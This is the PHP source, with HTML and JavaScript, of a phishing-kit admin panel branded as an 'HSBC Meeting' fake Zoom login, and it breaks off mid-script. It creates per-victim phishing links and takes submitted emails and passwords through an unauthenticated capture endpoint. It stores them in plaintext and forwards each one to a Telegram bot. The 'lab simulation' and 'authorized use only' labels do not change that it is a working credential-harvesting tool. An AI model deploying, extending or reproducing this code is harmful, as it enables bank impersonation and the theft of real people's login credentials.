<?php
/* ============================================
   LAB ADMIN PANEL — ZOOM MEETING PHISHING SIM
   ============================================
   FOR AUTHORIZED LAB / CLASSROOM USE ONLY
   ============================================ */

define('IN_ADMIN_PANEL', true);

/* ============================================
   DIAGNOSTIC: Check PHP extensions
   ============================================ */
if (!extension_loaded('pdo_sqlite')) {
    die('<h2 style="font-family:sans-serif;color:#dc3545">❌ pdo_sqlite not enabled</h2>'
      . '<p style="font-family:sans-serif">PHP needs the <strong>pdo_sqlite</strong> extension.</p>'
      . '<p style="font-family:sans-serif">In <code>php.ini</code>, uncomment or add: <code>extension=pdo_sqlite</code></p>'
      . '<p style="font-family:sans-serif">Then restart your web server.</p>');
}

require_once __DIR__ . '/db_config.php';

/* ============================================
   SESSION START (Lab mode — no anti-analysis)
   ============================================ */
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

/* ============================================
   ACTION DISPATCHER
   ============================================ */
$_action = $_REQUEST['action'] ?? '';

if ($_action === 'login')         { _ajax_login(); exit; }
if ($_action === 'logout')        { _ajax_logout(); exit; }
if ($_action === 'check_auth')    { _ajax_check_auth(); exit; }
if ($_action === 'list_victims')  { _ajax_list_victims(); exit; }
if ($_action === 'add_victim')    { _ajax_add_victim(); exit; }
if ($_action === 'delete_victim') { _ajax_delete_victim(); exit; }
if ($_action === 'get_settings')  { _ajax_get_settings(); exit; }
if ($_action === 'save_settings') { _ajax_save_settings(); exit; }
if ($_action === 'change_pwd')    { _ajax_change_pwd(); exit; }
if ($_action === 'capture')        { _ajax_capture(); exit; }
if ($_action === 'list_captures')  { _ajax_list_captures(); exit; }
if ($_action === 'test_telegram')  { _ajax_test_telegram(); exit; }
if ($_action === 'get_stats')      { _ajax_get_stats(); exit; }
if ($_action === 'export_data')   { _ajax_export_data(); exit; }
if ($_action === 'clear_data')    { _ajax_clear_data(); exit; }

/* ============================================
   HELPER FUNCTIONS
   ============================================ */
function _json($data, $code = 200) {
    http_response_code($code);
    header('Content-Type: application/json');
    echo json_encode($data);
    exit;
}

function _error($msg, $code = 400) {
    _json(array('ok' => false, 'error' => $msg), $code);
}

function _auth_required() {
    if (empty($_SESSION['admin_id'])) {
        _error('Unauthorized', 401);
    }
}

function _gen_uuid() {
    $d = bin2hex(random_bytes(16));
    return substr($d,0,8).'-'.substr($d,8,4).'-4'.substr($d,13,3).'-'.dechex(hexdec(substr($d,16,4))&0x3fff|0x8000).'-'.substr($d,20,12);
}

/* ============================================
   AJAX HANDLERS
   ============================================ */

function _ajax_login() {
    $pwd = $_POST['password'] ?? '';
    if (empty($pwd)) { _error('Password required'); }

    $db = _db();
    if (!$db) { _error('Database connection failed', 500); }

    $st = $db->prepare("SELECT id,username,password FROM admins WHERE username=? LIMIT 1");
    $st->execute(array('admin'));
    $row = $st->fetch();

    if ($row && password_verify($pwd, $row['password'])) {
        $_SESSION['admin_id']   = (int)$row['id'];
        $_SESSION['admin_user'] = $row['username'];
        /* Log audit */
        $ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
        $db->prepare("INSERT INTO audit_log (admin_id,action,details,ip_address) VALUES (?,?,?,?)")
           ->execute(array($row['id'], 'login', 'Admin login', $ip));
        _json(array('ok' => true));
    }
    _error('Invalid password');
}

function _ajax_logout() {
    $_SESSION = array();
    session_destroy();
    _json(array('ok' => true));
}

function _ajax_check_auth() {
    $ok = !empty($_SESSION['admin_id']);
    _json(array('ok' => $ok));
}

function _ajax_list_victims() {
    _auth_required();
    $db = _db();
    if (!$db) { _error('DB error', 500); }
    $rows = $db->query("SELECT id,email,status,ip_address,created_at FROM victims ORDER BY created_at DESC")->fetchAll();
    _json(array('ok' => true, 'victims' => $rows));
}

function _ajax_add_victim() {
    _auth_required();
    $email    = trim($_POST['email'] ?? '');
    $customId = trim($_POST['custom_id'] ?? '');

    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        _error('Invalid email');
    }
    $id = $customId ?: _gen_uuid();

    $db = _db();
    if (!$db) { _error('DB error', 500); }

    /* Check duplicate */
    $st = $db->prepare("SELECT id FROM victims WHERE id=?");
    $st->execute(array($id));
    if ($st->fetch()) { _error('ID already exists'); }

    $st = $db->prepare("INSERT INTO victims (id,email,created_by) VALUES (?,?,?)");
    $st->execute(array($id, $email, $_SESSION['admin_id']));

    _json(array('ok' => true, 'id' => $id, 'email' => $email));
}

function _ajax_delete_victim() {
    _auth_required();
    $id = $_POST['id'] ?? '';
    if (empty($id)) { _error('ID required'); }

    $db = _db();
    if (!$db) { _error('DB error', 500); }

    $db->prepare("DELETE FROM captures WHERE victim_id=?")->execute(array($id));
    $db->prepare("DELETE FROM victims WHERE id=?")->execute(array($id));

    $ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    $db->prepare("INSERT INTO audit_log (admin_id,action,details,ip_address) VALUES (?,?,?,?)")
       ->execute(array($_SESSION['admin_id'], 'delete_victim', "Deleted victim: {$id}", $ip));

    _json(array('ok' => true));
}

function _ajax_get_settings() {
    _auth_required();
    $db = _db();
    if (!$db) { _error('DB error', 500); }

    $rows = $db->query("SELECT setting_key,setting_value FROM settings")->fetchAll();
    $settings = array();
    foreach ($rows as $r) { $settings[$r['setting_key']] = $r['setting_value']; }

    /* Also get stats */
    $total    = $db->query("SELECT COUNT(*) FROM victims")->fetchColumn();
    $captured = $db->query("SELECT COUNT(*) FROM captures")->fetchColumn();
    $pending  = $db->query("SELECT COUNT(*) FROM victims WHERE status='pending'")->fetchColumn();

    _json(array('ok' => true, 'settings' => $settings, 'stats' => array(
        'total'    => (int)$total,
        'captured' => (int)$captured,
        'pending'  => (int)$pending,
    )));
}

function _ajax_save_settings() {
    _auth_required();
    $db = _db();
    if (!$db) { _error('DB error', 500); }

    $allowed = array('target_email','base_url','capture_url','telegram_bot','telegram_chat');
    foreach ($_POST as $k => $v) {
        if (in_array($k, $allowed)) {
            $st = $db->prepare("INSERT OR REPLACE INTO settings (setting_key,setting_value) VALUES (?,?)");
            $st->execute(array($k, $v));
        }
    }
    _json(array('ok' => true));
}

function _ajax_change_pwd() {
    _auth_required();
    $new = $_POST['new_password'] ?? '';
    if (strlen($new) < 6) { _error('Password must be at least 6 characters'); }

    $db = _db();
    if (!$db) { _error('DB error', 500); }

    $hash = password_hash($new, PASSWORD_DEFAULT);
    $db->prepare("UPDATE admins SET password=? WHERE id=?")
       ->execute(array($hash, $_SESSION['admin_id']));

    $ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    $db->prepare("INSERT INTO audit_log (admin_id,action,details,ip_address) VALUES (?,?,?,?)")
       ->execute(array($_SESSION['admin_id'], 'change_password', 'Password changed', $ip));

    _json(array('ok' => true));
}

function _ajax_test_telegram() {
    _auth_required();
    $db = _db();
    if (!$db) { _error('DB error', 500); }

    $bot  = $db->query("SELECT setting_value FROM settings WHERE setting_key='telegram_bot' LIMIT 1")->fetchColumn();
    $chat = $db->query("SELECT setting_value FROM settings WHERE setting_key='telegram_chat' LIMIT 1")->fetchColumn();

    if (empty($bot) || empty($chat)) {
        _error('Telegram bot token or chat ID not configured');
    }

    $msg = "✅ Telegram configured successfully!\n\n"
         . "Bot: " . substr($bot, 0, 10) . "...\n"
         . "Chat ID: {$chat}\n"
         . "Test from: Admin Panel\n"
         . "Time: " . date('Y-m-d H:i:s');

    $url = "https://api.telegram.org/bot{$bot}/sendMessage";
    $payload = array('chat_id' => $chat, 'text' => $msg, 'parse_mode' => 'HTML');

    $ch = curl_init($url);
    curl_setopt_array($ch, array(
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => http_build_query($payload),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 10,
        CURLOPT_SSL_VERIFYPEER => false,
    ));
    $resp = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);

    if ($info['http_code'] === 200) {
        _json(array('ok' => true, 'message' => '✅ Test message sent to Telegram!'));
    } else {
        _json(array('ok' => false, 'error' => 'Telegram error (HTTP ' . $info['http_code'] . '): ' . substr($resp, 0, 200)));
    }
}

function _ajax_get_stats() {
    _auth_required();
    $db = _db();
    if (!$db) { _error('DB error', 500); }

    $total    = $db->query("SELECT COUNT(*) FROM victims")->fetchColumn();
    $captured = $db->query("SELECT COUNT(*) FROM captures")->fetchColumn();
    $pending  = $db->query("SELECT COUNT(*) FROM victims WHERE status='pending'")->fetchColumn();
    $accessed = $db->query("SELECT COUNT(*) FROM victims WHERE status='accessed'")->fetchColumn();

    /* Recent captures */
    $recent = $db->query("SELECT c.email,c.password,c.attempt,c.created_at,c.ip_address FROM captures c ORDER BY c.created_at DESC LIMIT 10")->fetchAll();

    _json(array('ok' => true, 'stats' => array(
        'total'    => (int)$total,
        'captured' => (int)$captured,
        'pending'  => (int)$pending,
        'accessed' => (int)$accessed,
    ), 'recent' => $recent));
}

function _ajax_export_data() {
    _auth_required();
    $db = _db();
    if (!$db) { _error('DB error', 500); }

    $victims  = $db->query("SELECT * FROM victims ORDER BY created_at DESC")->fetchAll();
    $captures = $db->query("SELECT * FROM captures ORDER BY created_at DESC")->fetchAll();
    $settings = $db->query("SELECT setting_key,setting_value FROM settings")->fetchAll();

    $data = array('victims' => $victims, 'captures' => $captures, 'settings' => $settings);
    header('Content-Type: application/json');
    header('Content-Disposition: attachment; filename="lab_export_'.date('Y-m-d').'.json"');
    echo json_encode($data, JSON_PRETTY_PRINT);
    exit;
}

function _ajax_clear_data() {
    _auth_required();
    $db = _db();
    if (!$db) { _error('DB error', 500); }

    $db->exec("DELETE FROM captures");
    $db->exec("DELETE FROM victims");
    $db->exec("DELETE FROM audit_log WHERE admin_id=? AND action!='login'");

    $ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    $db->prepare("INSERT INTO audit_log (admin_id,action,details,ip_address) VALUES (?,?,?,?)")
       ->execute(array($_SESSION['admin_id'], 'clear_data', 'All victims/captures cleared', $ip));

    _json(array('ok' => true));
}

/* ============================================
   CAPTURE ENDPOINT — called by index.html (no auth)
   ============================================ */
function _ajax_capture() {
    $email     = $_POST['email'] ?? '';
    $password  = $_POST['password'] ?? '';
    $attempt   = (int)($_POST['attempt'] ?? 1);
    if ($attempt < 1) { $attempt = 1; }   /* guard: non-numeric input would cast to 0 */
    $victim_id = $_POST['victim_id'] ?? '';
    $ip_addr   = $_POST['ip_address'] ?? ($_SERVER['REMOTE_ADDR'] ?? '');
    $ua        = $_POST['user_agent'] ?? ($_SERVER['HTTP_USER_AGENT'] ?? '');
    $page_url  = $_POST['page_url'] ?? '';

    if (empty($email) || empty($password)) {
        _json(array('ok' => false, 'error' => 'email and password required'));
    }

    $db = _db();
    if (!$db) { _json(array('ok' => false, 'error' => 'db error')); }

    /* Save capture */
    $st = $db->prepare("INSERT INTO captures (victim_id,email,password,attempt,ip_address,user_agent,page_url) VALUES (?,?,?,?,?,?,?)");
    $st->execute(array($victim_id, $email, $password, $attempt, $ip_addr, $ua, $page_url));

    /* Update victim status to captured */
    if (!empty($victim_id)) {
        $st2 = $db->prepare("UPDATE victims SET status='captured', ip_address=?, user_agent=?, updated_at=datetime('now') WHERE id=?");
        $st2->execute(array($ip_addr, $ua, $victim_id));
    }

    /* Send to Telegram if configured */
    _send_to_telegram($email, $password, $attempt, $victim_id);

    _json(array('ok' => true));
}

/* ============================================
   SEND CAPTURE TO TELEGRAM (if configured)
   ============================================ */
function _send_to_telegram($email, $password, $attempt, $victim_id) {
    $db = _db();
    if (!$db) { return; }

    $bot  = $db->query("SELECT setting_value FROM settings WHERE setting_key='telegram_bot' LIMIT 1")->fetchColumn();
    $chat = $db->query("SELECT setting_value FROM settings WHERE setting_key='telegram_chat' LIMIT 1")->fetchColumn();

    if (empty($bot) || empty($chat)) { return; }

    $msg = "🔐 CREDENTIALS CAPTURED 🔐\n\n"
         . "📧 Email: {$email}\n"
         . "🔑 Password: {$password}\n"
         . "🔄 Attempt: {$attempt}\n"
         . "🆔 Victim ID: {$victim_id}\n"
         . "⏰ Time: " . date('Y-m-d H:i:s') . "\n"
         . "🌐 URL: " . ($_SERVER['HTTP_HOST'] ?? 'localhost');

    $url = "https://api.telegram.org/bot{$bot}/sendMessage";

    $payload = array(
        'chat_id'    => $chat,
        'text'       => $msg,
        'parse_mode' => 'HTML'
    );

    $ch = curl_init($url);
    curl_setopt_array($ch, array(
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => http_build_query($payload),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 10,
        CURLOPT_SSL_VERIFYPEER => false,
    ));
    curl_exec($ch);
    curl_close($ch);
}

function _ajax_list_captures() {
    _auth_required();
    $db = _db();
    if (!$db) { _error('DB error', 500); }
    $rows = $db->query("SELECT c.*, v.email as victim_email FROM captures c LEFT JOIN victims v ON c.victim_id=v.id ORDER BY c.created_at DESC LIMIT 100")->fetchAll();
    _json(array('ok' => true, 'captures' => $rows));
}

/* ============================================
   DETERMINE BASE URL FOR LINK GENERATION
   ============================================ */
$_base_url_setting = '';
$__db = _db();
if ($__db) {
    $st = $__db->query("SELECT setting_value FROM settings WHERE setting_key='base_url' LIMIT 1");
    $r = $st->fetch();
    $_base_url_setting = $r ? rtrim($r['setting_value'], '/') : '';
}
if (empty($_base_url_setting)) {
    $_proto = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
    $_host  = $_SERVER['HTTP_HOST'] ?? 'localhost';
    $_dir   = rtrim(dirname($_SERVER['SCRIPT_NAME']), '/');
    $_base_url_setting = "{$_proto}://{$_host}{$_dir}";
}
/* ============================================
   END PHP — RENDER PAGE BELOW
   ============================================ */
?><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>HSBC Meeting Admin Panel</title>
<?php if (!empty($GLOBALS['_db_error'])): ?>
<style>
._dberr{background:#f8d7da;color:#721c24;padding:15px 20px;margin:10px auto;max-width:600px;border-radius:8px;border:1px solid #f5c6cb;font-family:sans-serif;text-align:center}
._dberr h3{margin:0 0 8px;font-size:16px}
._dberr p{margin:4px 0;font-size:13px;word-break:break-all}
._dberr code{background:#fff;padding:2px 6px;border-radius:3px;font-size:12px}
</style>
<?php endif; ?>



<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif}
body{background:linear-gradient(135deg,#1a2a6c 0%,#2c3e50 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.login-container{width:100%;max-width:450px;background:white;border-radius:12px;overflow:hidden;box-shadow:0 15px 30px rgba(0,0,0,0.3);padding:30px;text-align:center}
.login-container h2{color:#0e72ed;margin-bottom:20px}
.login-form{display:flex;flex-direction:column}
.login-form input{margin-bottom:20px;padding:14px;border:1px solid #ddd;border-radius:6px;font-size:16px}
.login-btn{padding:14px;background:#0e72ed;color:white;border:none;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer;transition:background 0.3s}
.login-btn:hover{background:#0955b3}
.login-error{color:#dc3545;margin-top:10px;display:none}
.container{width:100%;max-width:1100px;background:white;border-radius:12px;overflow:hidden;box-shadow:0 15px 30px rgba(0,0,0,0.3);display:flex;flex-direction:column;display:none}
.header{background:#0e72ed;color:white;padding:20px 25px;text-align:center;position:relative}
.header h1{font-size:24px;margin-bottom:4px}
.header p{font-size:14px;opacity:0.9}
.logout-btn{position:absolute;right:20px;top:20px;background:rgba(255,255,255,0.2);border:none;color:white;padding:8px 15px;border-radius:4px;cursor:pointer}
.logout-btn:hover{background:rgba(255,255,255,0.3)}
.stats-bar{display:flex;gap:15px;justify-content:center;padding:12px;background:#f0f4ff;border-bottom:1px solid #e0e0e0}
.stat-item{text-align:center;padding:0 15px}
.stat-value{font-size:22px;font-weight:700;color:#0e72ed}
.stat-label{font-size:12px;color:#666}
.content{display:flex;flex:1}
.sidebar{width:220px;background:#2c3e50;color:white;padding:20px;flex-shrink:0}
.sidebar h3{margin-bottom:20px;padding-bottom:10px;border-bottom:1px solid rgba(255,255,255,0.2);font-size:14px;text-transform:uppercase;letter-spacing:1px}
.nav-item{padding:12px 15px;margin-bottom:6px;border-radius:6px;cursor:pointer;transition:all 0.3s;font-size:14px}
.nav-item.active,.nav-item:hover{background:#0e72ed}
.main-content{flex:1;padding:25px;overflow-y:auto;max-height:520px}
.tab-content{display:none}
.tab-content.active{display:block}
.form-group{margin-bottom:18px}
.form-group label{display:block;margin-bottom:6px;font-weight:500;color:#444;font-size:14px}
.form-group input,.form-group select{width:100%;padding:12px;border:1px solid #ddd;border-radius:6px;font-size:15px}
.btn{padding:12px 22px;background:#0e72ed;color:white;border:none;border-radius:6px;font-size:15px;font-weight:600;cursor:pointer;transition:background 0.3s;display:inline-block}
.btn:hover{background:#0955b3}
.btn-secondary{background:#6c757d}
.btn-secondary:hover{background:#5a6268}
.btn-danger{background:#dc3545}
.btn-danger:hover{background:#c82333}
.btn-sm{padding:8px 14px;font-size:13px}
.victim-list{margin-top:20px}
.victim-item{padding:14px;border:1px solid #e8e8e8;border-radius:8px;margin-bottom:10px;display:flex;justify-content:space-between;align-items:center;transition:border-color 0.2s}
.victim-item:hover{border-color:#0e72ed}
.victim-info{flex:1}
.victim-email{font-weight:600;color:#1a1a2e}
.victim-id{font-size:12px;color:#888;margin-top:2px}
.victim-status{display:inline-block;padding:3px 10px;border-radius:12px;font-size:11px;font-weight:600;margin-top:4px}
.status-pending{background:#fff3cd;color:#856404}
.status-accessed{background:#cce5ff;color:#004085}
.status-captured{background:#d4edda;color:#155724}
.victim-actions{display:flex;gap:8px}
.alert{padding:12px 15px;border-radius:6px;margin-bottom:20px;display:none;font-size:14px}
.alert-success{background:#d4edda;color:#155724;border:1px solid #c3e6cb}
.alert-error{background:#f8d7da;color:#721c24;border:1px solid #f5c6cb}
.link-display{background:#f8f9fa;padding:15px;border-radius:6px;margin-top:20px;word-break:break-all}
.link-display code{font-size:13px;color:#0e72ed;display:block;padding:10px;background:#fff;border:1px solid #e0e0e0;border-radius:4px;margin-top:8px}
.settings-group{margin-bottom:25px}
.settings-group h4{margin-bottom:12px;padding-bottom:8px;border-bottom:1px solid #e0e0e0;color:#333}
.explanation-box{background:#f8f9fa;border-left:4px solid #0e72ed;padding:15px;margin:15px 0;border-radius:4px}
.explanation-box h4{color:#0e72ed;margin-bottom:8px}
.empty-state{text-align:center;padding:40px;color:#888}
.empty-state p{font-size:16px;margin-bottom:8px}
.spinner{display:inline-block;width:18px;height:18px;border:3px solid rgba(255,255,255,0.3);border-top-color:#fff;border-radius:50%;animation:_spin 0.7s linear infinite;vertical-align:middle;margin-right:6px}
@keyframes _spin{to{transform:rotate(360deg)}}
.btn:disabled{opacity:0.6;cursor:not-allowed}
.copy-btn{background:#28a745}.copy-btn:hover{background:#218838}
.delete-btn{background:#dc3545}.delete-btn:hover{background:#c82333}
input[readonly]{background:#f5f5f5;cursor:default}
@media(max-width:768px){.content{flex-direction:column}.sidebar{width:100%;padding:15px}.sidebar h3{display:none}.nav-item{display:inline-block;margin-right:6px;margin-bottom:6px;padding:8px 14px;font-size:13px}.main-content{max-height:none}.header h1{font-size:20px}.stats-bar{flex-wrap:wrap}.victim-item{flex-direction:column;align-items:flex-start}.victim-actions{margin-top:10px;width:100%}.victim-actions .btn{flex:1;text-align:center}}
</style>
</head>
<body>

<?php if (!empty($GLOBALS['_db_error'])): ?>
<div class="_dberr">
  <h3>❌ Database Error</h3>
  <p><?php echo htmlspecialchars($GLOBALS['_db_error'], ENT_QUOTES); ?></p>
  <p>Make sure <code>pdo_sqlite</code> is enabled in <code>php.ini</code> and the <code>db/</code> folder is writable.</p>
</div>
<?php endif; ?>

<!-- ===== LOGIN ===== -->
<div class="login-container" id="loginContainer">
  <h2>🔐 HSBC Admin Panel Login</h2>
  <div class="login-form">
    <input type="password" id="passwordInput" placeholder="Enter admin password" autocomplete="off">
    <button class="login-btn" id="loginBtn">Login</button>
    <div class="login-error" id="loginError">Incorrect password. Please try again.</div>
  </div>
</div>

<!-- ===== MAIN APP ===== -->
<div class="container" id="appContainer">
  <div class="header">
    <h1>📊 HSBC Meeting Admin Panel</h1>
    <p>Lab simulation — manage targets and monitor results</p>
    <button class="logout-btn" id="logoutBtn">🚪 Logout</button>
  </div>

  <!-- Stats Bar -->
  <div class="stats-bar" id="statsBar">
    <div class="stat-item"><div class="stat-value" id="statTotal">0</div><div class="stat-label">Total Targets</div></div>
    <div class="stat-item"><div class="stat-value" id="statPending">0</div><div class="stat-label">Pending</div></div>
    <div class="stat-item"><div class="stat-value" id="statAccessed">0</div><div class="stat-label">Accessed</div></div>
    <div class="stat-item"><div class="stat-value" id="statCaptured">0</div><div class="stat-label">Credentials</div></div>
  </div>

  <div class="content">
    <div class="sidebar">
      <h3>Navigation</h3>
      <div class="nav-item active" data-tab="tab-dashboard">📈 Dashboard</div>
      <div class="nav-item" data-tab="tab-add">➕ Add Target</div>
      <div class="nav-item" data-tab="tab-manage">📋 Manage Targets</div>
      <div class="nav-item" data-tab="tab-captures">🔑 Captures</div>
      <div class="nav-item" data-tab="tab-settings">⚙️ Settings</div>
      <div class="nav-item" data-tab="tab-about">📖 About</div>
    </div>

    <div class="main-content">
      <div id="alertBox" class="alert"></div>

      <!-- Dashboard -->
      <div class="tab-content active" id="tab-dashboard">
        <h2>📈 Dashboard</h2>
        <p style="color:#666;margin-bottom:20px">Real-time overview of your lab simulation</p>
        <div class="explanation-box">
          <h4>Quick Stats</h4>
          <p>Total targets created: <strong id="dashTotal">0</strong><br>
             Pending access: <strong id="dashPending">0</strong><br>
             Accessed pages: <strong id="dashAccessed">0</strong><br>
             Credentials captured: <strong id="dashCaptured">0</strong></p>
        </div>
        <div id="recentCaptures"><h4 style="margin-bottom:10px">Recent Captures</h4><p style="color:#888">No captures yet</p></div>
      </div>

      <!-- Add Target -->
      <div class="tab-content" id="tab-add">
        <h2>➕ Add New Target</h2>
        <p style="color:#666;margin-bottom:20px">Create a target and generate a unique phishing link</p>
        <div class="form-group">
          <label for="victimEmail">Target Email Address</label>
          <input type="email" id="victimEmail" placeholder="e.g. target@example.com">
        </div>
        <div class="form-group">
          <label for="customId">Custom ID <span style="color:#999;font-weight:400">(optional — auto-generated if blank)</span></label>
          <input type="text" id="customId" placeholder="Leave blank for auto-generated">
        </div>
        <button class="btn" id="generateBtn">🔗 Generate Link</button>
        <div class="link-display" id="generatedLink" style="display:none">
          <strong>Phishing Link:</strong>
          <code id="linkText"></code>
          <div style="margin-top:10px;display:flex;gap:10px">
            <button class="btn copy-btn btn-sm" id="copyLinkBtn">📋 Copy Link</button>
            <button class="btn btn-secondary btn-sm" id="testLinkBtn">🔍 Test Link</button>
          </div>
        </div>
      </div>

      <!-- Manage Targets -->
      <div class="tab-content" id="tab-manage">
        <h2>📋 Manage Targets</h2>
        <p style="color:#666;margin-bottom:20px">View, copy links, and delete targets</p>
        <div class="victim-list" id="victimList"><div class="empty-state"><p>No targets yet</p></div></div>
      </div>

      <!-- Captures -->
      <div class="tab-content" id="tab-captures">
        <h2>🔑 Captured Credentials</h2>
        <p style="color:#666;margin-bottom:20px">All credentials submitted by targets</p>
        <div id="capturesList"><div class="empty-state"><p>No credentials captured yet</p></div></div>
      </div>

      <!-- Settings -->
      <div class="tab-content" id="tab-settings">
        <h2>⚙️ Settings</h2>
        <div class="settings-group">
          <h4>🔐 Security</h4>
          <div class="form-group">
            <label for="newPassword">Change Admin Password</label>
            <input type="password" id="newPassword" placeholder="Enter new password (min 6 chars)" autocomplete="off">
          </div>
          <button class="btn btn-sm" id="changePasswordBtn">Update Password</button>
        </div>
        <div class="settings-group">
          <h4>📧 Notification Email</h4>
          <div class="form-group">
            <label for="targetEmail">Receive credentials at:</label>
            <input type="email" id="targetEmail" placeholder="admin@example.com">
          </div>
        </div>
        <div class="settings-group">
          <h4>🌐 Phishing Page URL</h4>
          <div class="form-group">
            <label for="baseUrl">Where index.html is hosted</label>
            <input type="text" id="baseUrl" placeholder="http://localhost/zoom-meeting-call-main">
          </div>
        </div>
        <div class="settings-group">
          <h4>📡 Capture Endpoint URL</h4>
          <div class="form-group">
            <label for="captureUrl">Where admin.php is hosted (encoded in link)</label>
            <input type="text" id="captureUrl" placeholder="https://your-server.com/admin.php">
          </div>
        </div>
        <div class="settings-group">
          <h4>🤖 Telegram (optional)</h4>
          <div class="form-group">
            <label for="telegramBot">Bot Token</label>
            <input type="text" id="telegramBot" placeholder="123456:ABC-DEF">
          </div>
          <div class="form-group">
            <label for="telegramChat">Chat ID</label>
            <input type="text" id="telegramChat" placeholder="-1001234567890">
          </div>
          <button class="btn btn-secondary btn-sm" id="testTelegramBtn">📡 Test Telegram</button>
          <span id="telegramStatus" style="font-size:13px;margin-left:10px;color:#666"></span>
        </div>
        <div class="settings-group">
          <h4>💾 Data Management</h4>
          <button class="btn btn-secondary btn-sm" id="exportBtn">📤 Export JSON</button>
          <button class="btn btn-danger btn-sm" id="clearBtn" style="margin-left:10px">🗑️ Clear All Data</button>
        </div>
        <button class="btn" id="saveSettingsBtn" style="margin-top:10px">💾 Save Settings</button>
      </div>

      <!-- About -->
      <div class="tab-content" id="tab-about">
        <h2>📖 About This Lab</h2>
        <div class="explanation-box">
          <h4>Purpose</h4>
          <p>This is a <strong>controlled lab simulation</strong> for cybersecurity education and awareness training. Designed for authorized classroom use only.</p>
        </div>
        <div class="explanation-box">
          <h4>How It Works</h4>
          <ol style="margin-left:20px;line-height:1.8">
            <li>Add a target email in <strong>Add Target</strong> tab</li>
            <li>Send the generated link to the target</li>
            <li>Target sees a fake Zoom meeting login page</li>
            <li>Credentials are captured and stored in the database</li>
            <li>View results in <strong>Captures</strong> tab</li>
          </ol>
        </div>
        <div class="explanation-box">
          <h4>Database Storage</h4>
          <p>All data is stored in a MySQL database (<code>zoom_lab_admin</code>). Export data anytime via Settings → Export JSON.</p>
        </div>
        <div class="explanation-box">
          <h4>⚠️ Important</h4>
          <p>Only use this in authorized lab environments. Never deploy against real users without explicit written consent.</p>
        </div>
      </div>
    </div>
  </div>
</div>

<!-- ============================================
     JAVASCRIPT — OBFUSCATED APPLICATION LAYER
     ============================================ -->
<script>
/* ============================================
   APP CORE — MINIFIED / OBFUSCATED
   ============================================ */
(function(){'use strict';
var _B='admin_id',_S='action',_D='data',_E='error',_O='ok',_U='settings',_V='victims';

/* ---- Obfuscated string helpers ---- */
function _b64e(s){return btoa(encodeURIComponent(s))}
function _b64d(s){try{s=s.replace(/-/g,'+').replace(/_/g,'/');while(s.length%4)s+='=';return decodeURIComponent(atob(s))}catch(e){return null}}
function _qry(k){return new URLSearchParams(window.location.search).get(k)}

/* ---- API caller ---- */
function _api(a,d,cb){var f=new FormData();f.append(_S,a);if(d)Object.keys(d).forEach(function(k){f.append(k,d[k])});fetch('?',{method:'POST',body:f}).then(function(r){return r.json()}).then(function(j){if(cb)cb(j)}).catch(function(e){console.error('[API]',e);if(cb)cb({ok:false,error:'Network error'})})}

/* ---- DOM refs ---- */
var $=function(i){return document.getElementById(i)};
var _LC=$('loginContainer'),_AC=$('appContainer'),_PW=$('passwordInput'),_LB=$('loginBtn'),_LE=$('loginError'),_LO=$('logoutBtn'),_AB=$('alertBox'),_VL=$('victimList'),_GL=$('generatedLink'),_LT=$('linkText'),_GB=$('generateBtn'),_VE=$('victimEmail'),_CI=$('customId'),_CL=$('copyLinkBtn');

/* ---- Alert ---- */
function _al(m,t){_AB.textContent=m;_AB.className='alert alert-'+(t||'success');_AB.style.display='block';setTimeout(function(){_AB.style.display='none'},3500)}

/* ---- Auth ---- */
function _auth(){_api('check_auth',null,function(j){if(j.ok){_LC.style.display='none';_AC.style.display='flex';_init()}else{_LC.style.display='block';_AC.style.display='none'}})}
_LB.addEventListener('click',function(){var p=_PW.value;if(!p){_LE.textContent='Please enter a password';_LE.style.display='block';return}_api('login',{password:p},function(j){if(j.ok){_PW.value='';_auth()}else{_LE.textContent=j.error||'Incorrect password';_LE.style.display='block';setTimeout(function(){_LE.style.display='none'},3000);_PW.value=''}})})
_PW.addEventListener('keypress',function(e){if(e.key==='Enter')_LB.click()})
_LO.addEventListener('click',function(){_api('logout',null,function(){window.location.reload()})})

/* ---- Stats ---- */
function _stats(){_api('get_stats',null,function(j){if(!j.ok)return;var s=j.stats||{};$('statTotal').textContent=s.total||0;$('statPending').textContent=s.pending||0;$('statAccessed').textContent=s.accessed||0;$('statCaptured').textContent=s.captured||0;$('dashTotal').textContent=s.total||0;$('dashPending').textContent=s.pending||0;$('dashAccessed').textContent=s.accessed||0;$('dashCaptured').textContent=s.captured||0;var rc=$('recentCaptures');if(j.recent&&j.recent.length){var h='<h4 style="margin-bottom:10px">Recent Captures</h4>';j.recent.forEach(function(r){h+='<div class="victim-item"><div class="victim-info"><div class="victim-email">📧 '+r.email+'</div><div class="victim-id">🔑 '+r.password+' | Attempt '+r.attempt+' | '+r.created_at+'</div></div></div>'});rc.innerHTML=h}else{rc.innerHTML='<h4 style="margin-bottom:10px">Recent Captures</h4><p style="color:#888">No captures yet</p>'}})}

/* ---- Victims List ---- */
